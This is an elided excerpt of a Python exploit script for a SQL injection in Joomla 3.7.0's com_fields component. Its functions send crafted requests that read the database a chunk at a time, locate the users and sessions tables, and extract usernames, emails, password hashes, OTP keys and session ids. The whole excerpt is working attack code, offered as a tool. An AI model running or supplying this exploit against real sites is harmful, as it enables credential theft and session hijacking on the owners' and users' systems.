...
def joomla_370_sqli_extract(options, sess, token, colname, morequery):
    ...
    result = ''
    while length > offset:
        sqli = build_sqli("HEX(MID(%s,%d,%d))" %
                          (colname, offset + 1, 16), morequery)
...
def joomla_370_sqli(options, sess, token, sqli):
    ...
    resp = sess.get(options.url + "/index.php?option=com_fields&view=fields&layout=modal",
...
def extract_joomla_tables(options, sess, token):
    ...
    while True:
        result = joomla_370_sqli_extract(options, sess, token, "TABLE_NAME",
                                         "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(offset) + ",1")
        if result is None:
            if first:
...
def extract_joomla_users(options, sess, token, table_name):
    ...
    while True:
        result = joomla_370_sqli_extract(options, sess, token, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)",
...
def extract_joomla_sessions(options, sess, token, table_name):
    ...
    while True:
        result = joomla_370_sqli_extract(options, sess, token, "CONCAT(userid,0x7c,session_id,0x7c,username)",
